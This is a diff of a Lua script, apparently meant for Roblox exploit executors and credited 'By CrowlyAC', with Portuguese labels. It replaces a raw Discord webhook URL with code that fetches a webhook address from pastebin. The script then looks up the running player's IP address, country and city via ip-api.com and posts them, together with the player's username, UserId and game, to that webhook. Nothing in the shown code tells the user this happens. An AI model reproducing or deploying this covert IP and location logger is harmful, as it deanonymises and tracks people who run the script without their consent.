@@ -1,1 +1,69 @@
-https://discord.com/api/webhooks/1368601195530162216/T8g61_uQxgBS97IRgdmVDgl8SFT02LKUJTYCUJwrA5-Tq_wcaSTKj6Uco0uZCqqbGe7F
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local player = game.Players.LocalPlayer
+local requestFunc = (http_request or request or syn and syn.request or fluxus and fluxus.request)
+
+local webhook = nil
+
+if requestFunc then
+    local response = requestFunc({
+        Url = "https://pastebin.com/raw/HWK6UNgt",
+        Method = "GET"
+    })
+    if response and response.Body then
+        webhook = response.Body
+    end
+end
+
+local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+local gameName = gameInfo.Name or "Jogo desconhecido"
+local dataHora = os.date("%d/%m/%Y %H:%M:%S")
+
+local ip = "IP não disponível"
+local pais = "País não disponível"
+local cidade = "Cidade não disponível"
+
+if requestFunc then
+    local ipResponse = requestFunc({
+        Url = "http://ip-api.com/json/",
+        Method = "GET"
+    })
+    if ipResponse and ipResponse.Body then
+        local geoData = HttpService:JSONDecode(ipResponse.Body)
+        ip = geoData.query or ip
+        pais = geoData.country or pais
+        cidade = geoData.city or cidade
+    end
+end
+
+local embed = {
+    title = "📄 RCW Brookhaven log — " .. player.Name,
+    description = "O script foi executado no jogo **" .. gameName .. "**",
+    color = 65280,
+    fields = {
+        { name = "UserId", value = tostring(player.UserId), inline = true },
+        { name = "PlaceId", value = tostring(game.PlaceId), inline = true },
+        { name = "Horário de Execução", value = dataHora, inline = false },
+        { name = "IP", value = ip, inline = false },
+        { name = "País", value = pais, inline = true },
+        { name = "Cidade", value = cidade, inline = true }
+    },
+    footer = { text = "By CrowlyAC • Sintelx.gg" },
+    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+
+local payload = {
+    embeds = {embed}
+}
+local json = HttpService:JSONEncode(payload)
+
+if webhook and requestFunc then
+    requestFunc({
+        Url = webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = json
+    })
+end
